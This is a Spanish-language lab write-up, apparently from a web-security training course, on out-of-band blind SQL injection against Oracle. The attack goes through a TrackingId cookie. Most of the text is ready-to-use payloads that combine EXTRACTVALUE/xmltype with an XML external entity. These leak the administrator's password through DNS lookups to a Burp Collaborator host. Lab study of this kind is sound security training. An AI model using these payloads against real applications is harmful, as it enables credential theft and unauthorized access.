La vulnerabilidad se encuentra nuevamente en la cookie ‘**TrackingId**‘, donde inyectamos un payload que construye dinámicamente una petición DNS hacia un subdominio de Burp Collaborator. En este caso, concatenamos la contraseña del usuario ‘**administrator**‘ dentro de la URL del dominio, de modo que dicha información se filtre al servidor externo.

El ataque utiliza funciones de XML como ‘**EXTRACTVALUE**‘ y el tipo ‘**xmltype**‘, combinadas con subconsultas SQL (**SELECT password FROM users WHERE username=’administrator’**) que inyectan el dato como parte de la resolución DNS.

Finalmente, desde la pestaña Collaborator de Burp Suite, verificamos las interacciones registradas y recuperamos el valor exfiltrado. Con esta contraseña accedemos como administrador y resolvemos el laboratorio.

Esta técnica resulta extremadamente eficaz en entornos donde no hay errores, ni cambios en el tiempo de respuesta ni retroalimentación alguna, aprovechando canales secundarios para obtener información confidencial del sistema

------

Primero debemos de probar todas las posibilidades para sabes si es vulnerable a SQL, y en dado caso de no tener exito, realizamos el siguiente payload en el valor de la cookie TrackingId:

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

**Recuerda Urlencodear los ; y los % para que no entre en conflicto con el formato de la peticion**

Lo que podemos hacer, es testear si podemos meter datos como subdominio de la URL del colaborator:

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cadena.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

Para realizar una sentencia en Oracle debemos de ponerlo entre comillas y entre parentesis y realizar una concatenacion, haremos lo siguiente

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(query)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

Ahora ya podemos meter una query diseñada para minar informacion de la base de datos de oracle, mostrando el nombre del usuario administrator:

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select username from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

Para obtenemos el valor de la contraseña del usuario administrador:

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

Y el verificar en el Collaborator, se muestra la peticion DNS con la contraseña del usuario administrator.